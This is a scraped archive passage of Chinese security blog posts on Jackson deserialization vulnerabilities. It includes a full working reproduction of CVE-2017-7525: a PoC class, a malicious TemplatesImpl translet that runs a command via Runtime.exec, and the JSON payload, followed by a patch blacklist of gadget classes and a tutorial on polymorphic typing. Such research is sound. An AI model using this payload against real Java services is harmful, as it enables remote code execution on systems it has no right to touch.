OK，下一篇继续其他CVE利用链的分析。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）","date":"2019-11-16T08:52:35.000Z","path":"2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/","text":"本次Jackson反序列化漏洞对于Jackson来说是首例，因此针对这些版本范围的漏洞利用类有很多，这章节只用TemplatesImpl这条在Fastjson也盛行的利用类进行演示，其他利用链在后面的文章中会补充分析。 0x01 影响版本Jackson 2.6系列 &lt; 2.6.7.1 Jackson 2.7系列 &lt; 2.7.9.1 Jackson 2.8系列 &lt; 2.8.8.1 0x02 限制JDK使用1.7版本的，不能使用1.8版本，具体原因后面章节会分析到。 注意，小版本搞的1.7版本的也会有些不能成功利用，具体要自己测试才知道哪些版本是可用的。 我本地用的JDK版本为1.7.0_21，之前用的1.7.0_80没成功。 0x03 复现利用我本地用的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，commons-codec-1.12，commons-io-2.5，spring-core-4.3.13.RELEASE。 PoC.java，这里选择以开启DefaultTyping的方式进行反序列化： 123456789101112131415161718192021222324252627282930313233343536public class PoC &#123; public static void main(String[] args) &#123; String exp = readClassStr(\"./out/production/JSTest/com/evil/Exploit.class\"); String jsonInput = aposToQuotes(\"&#123;\\\"object\\\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\\n\" + \"&#123;\\n\" + \"'transletBytecodes':['\"+exp+\"'],\\n\" + \"'transletName':'mi1k7ea',\\n\" + \"'outputProperties':&#123;&#125;\\n\" + \"&#125;\\n\" + \"]\\n\" + \"&#125;\"); System.out.printf(jsonInput); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); Mi1k7ea mi1k7ea; try &#123; mi1k7ea = mapper.readValue(jsonInput, Mi1k7ea.class); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static String aposToQuotes(String json)&#123; return json.replace(\"'\",\"\\\"\"); &#125; public static String readClassStr(String cls)&#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); try &#123; FileCopyUtils.copy(new FileInputStream(new File(cls)),byteArrayOutputStream); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encode(byteArrayOutputStream.toByteArray()); &#125;&#125; Mi1k7ea.java，要进行反序列化的类： 12345package com.mi1k7ea;public class Mi1k7ea &#123; public Object object;&#125; Exploit.java，恶意类，至于为何要继承AbstractTranslet类可以参考《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》中的调试分析： 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class Exploit extends AbstractTranslet &#123; public Exploit() throws Exception &#123; try &#123; BufferedReader br = null; //修改成你想要执行的命令 Process p = Runtime.getRuntime().exec(\"calc\"); br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; StringBuilder sb = new StringBuilder(); while ((line = br.readLine()) != null) &#123; sb.append(line + \"\\n\"); System.out.println(sb); &#125; File file = new File(\"result.txt\"); //File file =new File(\"javaio-appendfile.txt\"); //if file doesnt exists, then create it if(!file.exists())&#123; file.createNewFile(); &#125; //true = append file FileWriter fileWritter = new FileWriter(file.getName(),true); BufferedWriter bufferWritter = new BufferedWriter(fileWritter); bufferWritter.write(sb.toString()); bufferWritter.close(); System.out.println(sb); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 运行即可成功触发弹计算器： Exploit类中换成其他命令的话运行结果保存在result.txt中： 这里我们看下PoC： 12345678910&#123; \"object\":[ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", &#123; \"transletBytecodes\":[\"xxx\"], \"transletName\":\"mi1k7ea\", \"outputProperties\":&#123;&#125; &#125; ]&#125; 这里解释下设置的几个JSON键值对： transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》； transletName——TemplatesImpl类对象的_name属性值； outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用； 0x04 调试分析在mi1k7ea = mapper.readValue(jsonInput, Mi1k7ea.class);中打下断点；同时，我们由之前Fastjson中的分析也知道，TemplatesImpl利用链的其中一步是调用了getOutputProperties()函数，我们也在这里打下断点。 下面开始调试，其中反序列化的处理过程和之前调试的一样，我们直接跟到关键的地方看看就好。 我们知道在BeanDeserializer.vanillaDeserialize()函数中会先新建Bean实例，然后调用deserializeAndSet()函数来解析属性值并设置到该Bean中；而在deserializeAndSet()函数中，会反射调用属性的setter方法来设置属性值。 前两个属性transletBytecodes和transletName都是通过反射机制调用setter方法设置的，但是outputProperties属性在deserializeAndSet()函数中是通过反射机制调用它的getter方法，这就是该利用链能被成功触发的原因，虽然Jackson的反序列化机制只是调用setter方法，但是是调用SetterlessProperty.deserializeAndSet()来解析outputProperties属性而前面两个属性是调用的MethodProperty.deserializeAndSet()解析的，其中SetterlessProperty.deserializeAndSet()函数中是调用属性的getter方法而非setter方法： 再往下就是反射调用到了getOutputProperties()： 再后面就和Fastjson中分析的一样了，这里不再赘述。 利用链：getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;恶意类构造函数 到getOutputProperties()时的函数调用栈如下： 123456789101112131415161718getOutputProperties:431, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:57, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:601, Method (java.lang.reflect)deserializeAndSet:105, SetterlessProperty (com.fasterxml.jackson.databind.deser.impl)vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)deserializeAndSet:101, FieldProperty (com.fasterxml.jackson.databind.deser.impl)vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:27, PoC 0x05 为什么要设置transletName属性值PoC不写该属性值的话会报错，我们调试分析下原因。 跟踪到getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()这条调用链时发现，问题出在TemplatesImpl.getTransletInstance()函数中： 由于此处_name为null，导致程序提前return了，并未进入后面生成Java了以及新建该Java类实例的代码中，从而也无法成功触发漏洞。 由前面调试分析可知，transletBytecodes和transletName属性值都是通过调用MethodProperty.deserializeAndSet()函数来反射调用其setter方法来设置的。 这里我们重新transletName属性带上，再次调试，跟进设置transletName属性值时的MethodProperty.deserializeAndSet()函数中，发现其调用的setter方法就是TemplatesImpl.setTransletName()函数： 因此这个属性值是必须的，不能为null。 0x06 高版本JDK不能触发的原因——_tfactory在大版本下，JDK1.7和1.8中，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类是有所不同的。 当然，在小版本较高的1.7和某些1.8的还是能够成功触发的，具体的可自行测试。 在我本地的JDK 1.8.0_73 版本中，看到在TemplatesImpl.getTransletInstance()方法中调用了defineTransletClasses()函数来定义Java类，跟进看看： 区别在于新建TransletClassLoader类实例的代码，其中调用了_factory属性，但是该属性值我们没有在PoC中设置，默认为null，于是就会抛出异常了。 那么如何设置这个_factory属性呢？我们在PoC中随便填入如&#39;_factory&#39;:{},，会看到如下错误信息： 1com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field &quot;_factory&quot; (class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl), not marked as ignorable (5 known properties: &quot;uriresolver&quot;, &quot;transletBytecodes&quot;, &quot;outputProperties&quot;, &quot;transletName&quot;, &quot;stylesheetDOM&quot;]) 可以看到，这个错误是Jackson.databind报的，说的是TemplatesImpl类已知的只有5个配置项，即”uriresolver”, “transletBytecodes”, “outputProperties”, “transletName”, “stylesheetDOM”。 在里面没有看到tfactory相关字样，也就是说，Jackson压根就不支持我们在序列化的TemplatesImpl类的内容上添加并解析_tfactory属性。 0x07 补丁分析这里将jackson-databind-2.7.9换成jackson-databind-2.7.9.1。 尝试运行会报错如下，显示因为某些安全原因禁止了该类的加载： 1com.fasterxml.jackson.databind.JsonMappingException: Illegal type (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) to deserialize: prevented for security reasons 调试分析，在调用BeanDeserializerFactory.createBeanDeserializer()函数创建Bean反序列化器的时候，其中会调用checkIllegalTypes()函数提取当前类名，然后使用黑名单进行过滤： 注意：实际调试的时候回调用两次BeanDeserializerFactory.createBeanDeserializer()-&gt;checkIllegalTypes()，第一次由于是Mi1k7ea类，因此不会被过滤；第二次是TemplatesImpl类，由于其在黑名单中，因此被过滤了。 在jackson-databind-2.7.9.1-sources.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java中，存在默认的黑名单DEFAULT_NO_DESER_CLASS_NAMES，将TemplatesImpl类以及早期其他常用反序列化利用类都过滤了： 1234567891011121314static &#123; Set&lt;String&gt; s = new HashSet&lt;String&gt;(); // Courtesy of [https://github.com/kantega/notsoserial]: // (and wrt [databind#1599] s.add(\"org.apache.commons.collections.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections.functors.InstantiateTransformer\"); s.add(\"org.apache.commons.collections4.functors.InvokerTransformer\"); s.add(\"org.apache.commons.collections4.functors.InstantiateTransformer\"); s.add(\"org.codehaus.groovy.runtime.ConvertedClosure\"); s.add(\"org.codehaus.groovy.runtime.MethodClosure\"); s.add(\"org.springframework.beans.factory.ObjectFactory\"); s.add(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);&#125; OK，17年经典的Jackson反序列化漏洞就说到这，利用链是和Fastjson一样的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，两者的利用链很多都是可以共用的，但是会有些细微的区别。下一篇文章看看Jackson其他反序列化利用链及CVE漏洞。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Jackson系列一——反序列化漏洞基本原理","date":"2019-11-13T15:01:02.000Z","path":"2019/11/13/Jackson系列一——反序列化漏洞基本原理/","text":"0x01 Jackson简介Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。 由于其使用简单，速度较快，且不依靠除JDK外的其他库，被众多用户所使用。 0x02 使用Jackson进行序列化和反序列化Jackson提供了ObjectMapper.writeValueAsString()和ObjectMapper.readValue()两个方法来实现序列化和反序列化的功能。 我本地测试用到的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9 定义Person类： 123456789public class Person &#123; public int age; public String name; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s\", age, name); &#125;&#125; JSTest.java： 1234567891011121314public class JSTest &#123; public static void main(String[] args) throws Exception &#123; Person p = new Person(); p.age = 6; p.name = \"mi1k7ea\"; ObjectMapper mapper = new ObjectMapper(); String json = mapper.writeValueAsString(p); System.out.println(json); Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 输出： 12&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;mi1k7ea&quot;&#125;Person.age=6, Person.name=mi1k7ea 0x03 多态问题的解决——JacksonPolymorphicDeserialization简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。 那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。 JacksonPolymorphicDeserialization即Jackson多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。 简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即DefaultTyping和@JsonTypeInfo注解。 下面具体介绍一下。 DefaultTypingJackson提供一个enableDefaultTyping设置，其包含4个值，查看jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java可看到相关介绍信息： 123456789101112131415161718192021222324252627282930313233343536373839public enum DefaultTyping &#123; /** * This value means that only properties that have * &#123;@link java.lang.Object&#125; as declared type (including * generic types without explicit type) will use default * typing. */ JAVA_LANG_OBJECT, /** * Value that means that default typing will be used for * properties with declared type of &#123;@link java.lang.Object&#125; * or an abstract type (abstract class or interface). * Note that this does &lt;b&gt;not&lt;/b&gt; include array types. *&lt;p&gt; * Since 2.4, this does NOT apply to &#123;@link TreeNode&#125; and its subtypes. */ OBJECT_AND_NON_CONCRETE, /** * Value that means that default typing will be used for * all types covered by &#123;@link #OBJECT_AND_NON_CONCRETE&#125; * plus all array types for them. *&lt;p&gt; * Since 2.4, this does NOT apply to &#123;@link TreeNode&#125; and its subtypes. */ NON_CONCRETE_AND_ARRAYS, /** * Value that means that default typing will be used for * all non-final types, with exception of small number of * \"natural\" types (String, Boolean, Integer, Double), which * can be correctly inferred from JSON; as well as for * all arrays of non-final types. *&lt;p&gt; * Since 2.4, this does NOT apply to &#123;@link TreeNode&#125; and its subtypes. */ NON_FINAL &#125; 默认情况下，即无参数的enableDefaultTyping是第二个设置，OBJECT_AND_NON_CONCRETE。 下面分别对这几个选项进行说明。 JAVA_LANG_OBJECTJAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个Object类型时，会对该Object类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化的类） 添加一个com.mi1k7ea.Hacker类： 12345package com.mi1k7ea;public class Hacker &#123; public String skill = \"Jackson\";&#125; 修改Person类，添加Object类型属性： 12345678910public class Person &#123; public int age; public String name; public Object object; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s\", age, name, object == null ? \"null\" : object); &#125;&#125; 修改JSTest.java，添加enableDefaultTyping()并设置为JAVA_LANG_OBJECT： 1234567891011121314151617public class JSTest &#123; public static void main(String[] args) throws Exception &#123; Person p = new Person(); p.age = 6; p.name = \"mi1k7ea\"; p.object = new Hacker(); ObjectMapper mapper = new ObjectMapper(); // 设置JAVA_LANG_OBJECT mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT); String json = mapper.writeValueAsString(p); System.out.println(json); Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 输出对比看到，通过enableDefaultTyping()设置设置JAVA_LANG_OBJECT后，会多输出Hacker类名，且在输出的Object属性时直接输出的是Hacker类对象，也就是说同时对Object属性对象进行了序列化和反序列化操作： 1234567// 设置JAVA_LANG_OBJECT&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":[\"com.mi1k7ea.Hacker\",&#123;\"skill\":\"Jackson\"&#125;]&#125;Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@7f9a81e8// 未设置JAVA_LANG_OBJECT&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":&#123;\"skill\":\"Jackson\"&#125;&#125;Person.age=6, Person.name=mi1k7ea, &#123;skill=Jackson&#125; OBJECT_AND_NON_CONCRETEOBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。此外，enableDefaultTyping()默认的无参数的设置就是此选项。 添加com.mi1k7ea.Sex接口类： 1234public interface Sex &#123; public void setSex(int sex); public int getSex();&#125; 添加com.mi1k7ea.MySex类实现Sex接口类： 12345678910111213public class MySex implements Sex &#123; int sex; @Override public int getSex() &#123; return sex; &#125; @Override public void setSex(int sex) &#123; this.sex = sex; &#125;&#125; 修改Person类： 1234567891011public class Person &#123; public int age; public String name; public Object object; public Sex sex; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s, %s\", age, name, object == null ? \"null\" : object, sex == null ? \"null\" : sex); &#125;&#125; 修改JSTest.java： 1234567891011121314151617181920public class JSTest &#123; public static void main(String[] args) throws Exception &#123; Person p = new Person(); p.age = 6; p.name = \"mi1k7ea\"; p.object = new Hacker(); p.sex = new MySex(); ObjectMapper mapper = new ObjectMapper(); // 设置OBJECT_AND_NON_CONCRETE mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE); // 或直接无参调用，输出一样 //mapper.enableDefaultTyping(); String json = mapper.writeValueAsString(p); System.out.println(json); Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 输出，可以看到该Interface类属性被成功序列化和反序列化： 12&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":[\"com.mi1k7ea.Hacker\",&#123;\"skill\":\"Jackson\"&#125;],\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":0&#125;]&#125;Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@62ee68d8, com.mi1k7ea.MySex@735b5592 NON_CONCRETE_AND_ARRAYSNON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持Array类型。 下面直接修改JSTest.java，在Object属性中存在的是数组： 123456789101112131415161718192021public class JSTest &#123; public static void main(String[] args) throws Exception &#123; Person p = new Person(); p.age = 6; p.name = \"mi1k7ea\"; Hacker[] hackers = new Hacker[2]; hackers[0] = new Hacker(); hackers[1] = new Hacker(); p.object = hackers; p.sex = new MySex(); ObjectMapper mapper = new ObjectMapper(); // 设置NON_CONCRETE_AND_ARRAYS mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS); String json = mapper.writeValueAsString(p); System.out.println(json); Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 输出看到，类名变成了”[L”+类名+”;”，序列化Object之后为数组形式，反序列化之后得到[Lcom.mi1k7ea.Hacker;类对象，说明对Array类型成功进行了序列化和反序列化： 12&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":[\"[Lcom.mi1k7ea.Hacker;\",[&#123;\"skill\":\"Jackson\"&#125;,&#123;\"skill\":\"Jackson\"&#125;]],\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":0&#125;]&#125;Person.age=6, Person.name=mi1k7ea, [Lcom.mi1k7ea.Hacker;@724af044, com.mi1k7ea.MySex@4678c730 NON_FINALNON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。 修改Person类，添加Hacker属性： 123456789101112public class Person &#123; public int age; public String name; public Object object; public Sex sex; public Hacker hacker; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s, %s, %s\", age, name, object == null ? \"null\" : object, sex == null ? \"null\" : sex, hacker == null ? \"null\" : hacker); &#125;&#125; 修改JSTest.java： 12345678910111213141516171819public class JSTest &#123; public static void main(String[] args) throws Exception &#123; Person p = new Person(); p.age = 6; p.name = \"mi1k7ea\"; p.object = new Hacker(); p.sex = new MySex(); p.hacker = new Hacker(); ObjectMapper mapper = new ObjectMapper(); // 设置NON_FINAL mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); String json = mapper.writeValueAsString(p); System.out.println(json); Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 输出看到，成功对非final的hacker属性进行序列化和反序列化： 12[\"Person\",&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":[\"com.mi1k7ea.Hacker\",&#123;\"skill\":\"Jackson\"&#125;],\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":0&#125;],\"hacker\":[\"com.mi1k7ea.Hacker\",&#123;\"skill\":\"Jackson\"&#125;]&#125;]Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@62ee68d8, com.mi1k7ea.MySex@735b5592, com.mi1k7ea.Hacker@58651fd0 小结从前面的分析知道，DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表： DefaultTyping类型 描述说明 JAVA_LANG_OBJECT 属性的类型为Object OBJECT_AND_NON_CONCRETE 属性的类型为Object、Interface、AbstractClass NON_CONCRETE_AND_ARRAYS 属性的类型为Object、Interface、AbstractClass、Array NON_FINAL 所有除了声明为final之外的属性 @JsonTypeInfo注解@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值： 12345@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM) 下面我们逐个看下。 JsonTypeInfo.Id.NONEJSTest.java： 123456789101112131415public class JSTest &#123; public static void main(String[] args) throws Exception &#123; Person p = new Person(); p.age = 6; p.name = \"mi1k7ea\"; p.object = new Hacker(); ObjectMapper mapper = new ObjectMapper(); String json = mapper.writeValueAsString(p); System.out.println(json); Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; Person类，给object属性添加@JsonTypeInfo注解，指定为JsonTypeInfo.Id.NONE： 1234567891011public class Person &#123; public int age; public String name; @JsonTypeInfo(use = JsonTypeInfo.Id.NONE) public Object object; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s\", age, name, object == null ? \"null\" : object); &#125;&#125; 输出看到，和没有设置值为JsonTypeInfo.Id.NONE的@JsonTypeInfo注解是一样的： 12&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":&#123;\"skill\":\"Jackson\"&#125;&#125;Person.age=6, Person.name=mi1k7ea, &#123;skill=Jackson&#125; JsonTypeInfo.Id.CLASS修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.CLASS。 输出看到，object属性中多了”@class”:”com.mi1k7ea.Hacker”，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化： 12&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":&#123;\"@class\":\"com.mi1k7ea.Hacker\",\"skill\":\"Jackson\"&#125;&#125;Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@1d057a39 也就是说，在Jackson反序列化的时候如果使用了JsonTypeInfo.Id.CLASS修饰的话，可以通过@class的方式指定相关类，并进行相关调用。 JsonTypeInfo.Id.MINIMAL_CLASS修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.MINIMAL_CLASS。 输出看到，object属性中多了”@c”:”com.mi1k7ea.Hacker”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用： 12&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":&#123;\"@c\":\"com.mi1k7ea.Hacker\",\"skill\":\"Jackson\"&#125;&#125;Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@4c70fda8 JsonTypeInfo.Id.NAME修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.NAME。 输出看到，object属性中多了”@type”:”Hacker”，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的： 12&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":&#123;\"@type\":\"Hacker\",\"skill\":\"Jackson\"&#125;&#125;Exception in thread \"main\" com.fasterxml.jackson.databind.JsonMappingException: Could not resolve type id 'Hacker' into a subtype of [simple type, class java.lang.Object]: known type ids = [Object] JsonTypeInfo.Id.CUSTOM其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常： 1Exception in thread &quot;main&quot; java.lang.IllegalStateException: Do not know how to construct standard type id resolver for idType: CUSTOM 小结由前面测试发现，当@JsonTypeInfo注解设置为如下值之一并且修饰的是Object类型的属性时，可以利用来触发Jackson反序列化漏洞： JsonTypeInfo.Id.CLASS JsonTypeInfo.Id.MINIMAL_CLASS 0x04 反序列化中类属性方法的调用这里只针对Jackson反序列化过程中存在的一些方法调用进行分析，并且只针对应用JacksonPolymorphicDeserialization机制的场景进行分析。 下面简单看下两个实现方式间是否有区别。 当使用DefaultTyping时修改Person类： 12345678910public class Person &#123; public int age; public String name; public Sex sex; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s\", age, name, sex == null ? \"null\" : sex); &#125;&#125; 在MySex类中的方法中添加输出： 123456789101112131415161718public class MySex implements Sex &#123; int sex; public MySex() &#123; System.out.println(\"MySex构造函数\"); &#125; @Override public int getSex() &#123; System.out.println(\"MySex.getSex\"); return sex; &#125; @Override public void setSex(int sex) &#123; System.out.println(\"MySex.setSex\"); this.sex = sex; &#125;&#125; 修改JSTest.java，只进行反序列化操作并调用无参数的enableDefaultTyping()： 12345678910public class JSTest &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String json = \"&#123;\\\"age\\\":6,\\\"name\\\":\\\"mi1k7ea\\\",\\\"sex\\\":[\\\"com.mi1k7ea.MySex\\\",&#123;\\\"sex\\\":1&#125;]&#125;\"; Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 输出，看到调用了目标类的构造函数和setter方法： 123MySex构造函数MySex.setSexPerson.age=6, Person.name=mi1k7ea, com.mi1k7ea.MySex@153f5a29 当使用@JsonTypeInfo注解时修改Person类，在sex属性前添加注解： 123456789101112public class Person &#123; public int age; public String name; @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) // 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) public Sex sex; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s\", age, name, sex == null ? \"null\" : sex); &#125;&#125; 修改JSTest.java，注释掉enableDefaultTyping()： 12345678910public class JSTest &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper();// mapper.enableDefaultTyping(); String json = \"&#123;\\\"age\\\":6,\\\"name\\\":\\\"mi1k7ea\\\",\\\"sex\\\":[\\\"com.mi1k7ea.MySex\\\",&#123;\\\"sex\\\":1&#125;]&#125;\"; Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 输出看到，和使用DefaultTyping是一样的： 123MySex构造函数MySex.setSexPerson.age=6, Person.name=mi1k7ea, com.mi1k7ea.MySex@5ae9a829 调试分析Jackson反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。 这里以第一个例子来进行Jackson反序列化过程的调试分析，在Person p2 = mapper.readValue(json, Person.class);处打上断点，同时在MySex类的构造函数、getter、setter方法中设置断点，然后开始调试。 另外，为了方便，给Person类加上个构造函数： 123456789101112131415public class Person &#123; public int age; public String name;// @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) public Sex sex; public Person() &#123; System.out.println(\"Person构造函数\"); &#125; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s\", age, name, sex == null ? \"null\" : sex); &#125;&#125; BeanDeserializer.deserialize()函数中，调用了vanillaDeserialize()函数： 跟进去，BeanDeserializer.vanillaDeserialize()函数的实现比较简单，先调用createUsingDefault()函数来调用指定类的无参构造函数来生成类实例： BeanDeserializer.vanillaDeserialize()函数调用完无参的类的构造函数生成实例Bean后，就开始进入do while循环来循环解析键值对中的属性值并调用deserializeAndSet()函数来解析并设置Bean的属性值： 跟进去FieldProperty.deserializeAndSet()函数中，发现调用了deserialize()函数： 跟进该SettableBeanProperty.deserialize()函数，可以看到有两个反序列化的代码逻辑，其中if判断语句会判断当前反序列化的内容是否携带类型，若是则调用deserializeWithType()函数解析，否则直接调用deserialize()函数解析： 这里第一个属性是age，属于Int类型，因此调用的是NumberDeserializers.deserialize()函数来获取age属性的值： 反序列化解析得到属性值之后，回到FieldProperty.deserializeAndSet()函数中，调用属性的setter方法来设置Bean的属性值： 接着就是回到BeanDeserializer.vanillaDeserialize()函数中的do while循环中继续解析name、sex等属性内容。 name和前面age一样的调用过程，sex属性值是包含类名的数组，因此直接调试到解析sex属性时看到，在SettableBeanProperty.deserialize()函数中进入到了调用deserializeWithType()函数解析的代码逻辑，因为此时_valueTypeDeserializer值不为null： 跟进AbstractDeserializer.deserializeWithType()函数中，进一步调用了AsArrayTypeDeserializer.deserializeTypedFromObject()函数来解析： 跟进去，看到调用_locateTypeId()函数获取到了typeId为”com.mi1k7ea.MySex”即已经获取到我们的类型名称，然后根据该typeId调用_findDeserializer()函数寻找对应的反序列化器： 跟进去，其中调用findContextualValueDeserializer()找到typeId类型对应的反序列化器，然后缓存到_deserializers这个Map变量中，然后返回该反序列化器： 